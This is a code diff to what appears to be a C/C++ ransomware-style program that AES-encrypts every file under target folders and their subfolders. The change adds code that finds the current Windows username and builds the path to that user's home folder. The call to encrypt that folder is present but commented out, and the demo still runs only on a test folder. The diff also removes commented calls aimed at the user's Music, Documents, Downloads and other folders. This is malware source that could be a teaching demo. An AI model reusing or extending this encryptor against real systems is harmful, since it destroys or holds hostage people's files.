@@ -5,11 +5,12 @@
 #include <string.h>
 
 #ifdef _WIN32
+#include <lmcons.h>
 #include <fileapi.h>
 #include <windows.h>
 #else
-#include <unistd.h>
 #include <dirent.h>
+#include <unistd.h>
 #endif
 
 #include "aes.h"
@@ -50,8 +51,8 @@ void ANSI_X9_23(char* filename) {
   pad[len - 1] = len;
   fwrite(pad, sizeof(uint8_t), len, file);
   rewind(file);
-  delete[] pad;
   fclose(file);
+  delete[] pad;
 }
 
 void EncryptFile(char* fname, const uint8_t* key) {
@@ -126,12 +127,15 @@ int main() {
   /// ENCRYPT FILES
   // Encrypt Files in those folders and subfolders:
 #ifdef _WIN32
+  DWORD length = UNLEN + 1;
+  char username[length];
+  GetUserName(username, &length);
+  char* path = new char[length + 12];
+  sprintf(path, "C:\\Users\\%s", username);
+  // Encrypt user folder
+  //SearchFiles(path, key);
+  // Encrypt example folder
   SearchFiles("..\\testfolder", key);
-  //SearchFiles("C:\\Users\\User\\Music", key);
-  //SearchFiles("C:\\Users\\User\\Videos", key);
-  //SearchFiles("C:\\Users\\User\\Pictures", key);
-  //SearchFiles("C:\\Users\\User\\Documents", key);
-  //SearchFiles("C:\\Users\\User\\Downloads", key);
 #else
   SearchFiles("../testfolder", key);
 #endif
